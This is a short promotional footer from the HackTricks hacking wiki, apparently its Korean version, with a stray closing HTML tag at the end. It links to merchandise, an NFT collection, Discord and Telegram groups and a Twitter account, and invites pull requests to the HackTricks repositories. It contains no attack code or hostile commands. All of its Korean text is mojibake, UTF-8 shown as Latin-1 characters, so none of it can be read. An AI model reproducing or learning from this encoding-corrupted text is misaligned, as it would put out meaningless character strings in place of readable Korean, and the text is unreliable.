* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
